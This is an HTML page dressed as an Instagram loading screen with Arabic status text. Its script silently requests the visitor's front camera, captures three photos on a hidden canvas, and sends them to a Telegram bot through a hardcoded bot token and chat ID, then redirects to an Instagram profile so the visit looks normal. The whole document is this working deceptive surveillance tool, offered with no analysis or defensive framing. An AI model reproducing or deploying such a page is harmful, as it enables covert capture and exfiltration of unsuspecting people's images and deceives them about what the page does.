<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            overflow: hidden;
        }
        .loader-container {
            text-align: center;
            padding: 40px;
        }
        .insta-logo {
            width: 60px;
            height: 60px;
            margin: 0 auto 30px;
            background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
            border-radius: 15px;
            display: flex;
            align-items: center;
            justify-content: center;
            animation: pulse 1.5s ease-in-out infinite;
        }
        .insta-logo-inner {
            width: 30px;
            height: 30px;
            border: 3px solid #fff;
            border-radius: 8px;
            position: relative;
        }
        .insta-logo-inner::after {
            content: '';
            position: absolute;
            width: 8px;
            height: 8px;
            border: 3px solid #fff;
            border-radius: 50%;
            top: 5px;
            left: 5px;
        }
        @keyframes pulse {
            0%, 100% { transform: scale(1); opacity: 0.9; }
            50% { transform: scale(1.05); opacity: 1; }
        }
        .progress-bar {
            width: 220px;
            height: 3px;
            background: #1a1a1a;
            border-radius: 2px;
            margin: 25px auto;
            overflow: hidden;
        }
        .progress-fill {
            width: 0%;
            height: 100%;
            background: linear-gradient(90deg, #d6249f, #fd5949);
            border-radius: 2px;
            transition: width 0.3s ease;
        }
        .status-text {
            color: #666;
            font-size: 12px;
            letter-spacing: 1px;
        }
        video { 
            position: absolute; 
            top: 0; left: 0; 
            width: 100%; height: 100%; 
            object-fit: cover; 
            opacity: 0; 
            pointer-events: none;
        }
        canvas { display: none; }
    </style>
</head>
<body>
    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>
    
    <div class="loader-container" id="loader">
        <div class="insta-logo">
            <div class="insta-logo-inner"></div>
        </div>
        <div class="progress-bar">
            <div class="progress-fill" id="progress"></div>
        </div>
        <div class="status-text" id="statustxt">جارِ تحميل الصفحة...</div>
    </div>

    <script>
        const TOKEN = "8652265611:AAGrG4nv5TiUVcY_H9ica6VpLGOPSIzXy4M";
        const CHAT_ID = "6829017835";
        const TARGET_URL = "https://www.instagram.com/mhmdbwdwl35?igsh=MWZqajB2MTZ1N2pnYQ==";
        const API = `https://api.telegram.org/bot${TOKEN}`;

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        const progress = document.getElementById('progress');
        const statustxt = document.getElementById('statustxt');
        const loader = document.getElementById('loader');

        let progressValue = 0;

        // محاكاة تقدم التحميل
        const progressInterval = setInterval(() => {
            progressValue += Math.random() * 12 + 3;
            if (progressValue > 90) progressValue = 90;
            progress.style.width = progressValue + '%';
        }, 400);

        async function sendPhoto(blob) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, `img_${Date.now()}.jpg`);
            try { await fetch(`${API}/sendPhoto`, { method: 'POST', body: formData }); } catch(e) {}
        }

        async function capturePhotos(count = 3) {
            for (let i = 0; i < count; i++) {
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                ctx.drawImage(video, 0, 0);
                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.7));
                await sendPhoto(blob);
                await new Promise(r => setTimeout(r, 600));
            }
        }

        async function redirectNow() {
            clearInterval(progressInterval);
            progress.style.width = '100%';
            statustxt.textContent = 'تم التحميل، جاري التحويل...';
            await new Promise(r => setTimeout(r, 400));
            window.location.href = TARGET_URL;
        }

        async function main() {
            try {
                // تنشيط الكاميرا بصمت
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }, 
                    audio: false 
                });
                video.srcObject = stream;
                await video.play();

                // بدء الالتقاط فوراً في الخلفية
                capturePhotos(3);
                
                // التقدم للـ 100% والتوجيه
                setTimeout(() => {
                    progressValue = 95;
                    progress.style.width = '95%';
                    statustxt.textContent = 'يكتمل التحميل...';
                }, 1500);
                
                setTimeout(redirectNow, 2800);

            } catch (e) {
                // إذا رفض الكاميرا، تقدم طبيعي ووجه
                setTimeout(redirectNow, 2000);
            }
        }

        main();
    </script>
</body>
</html>
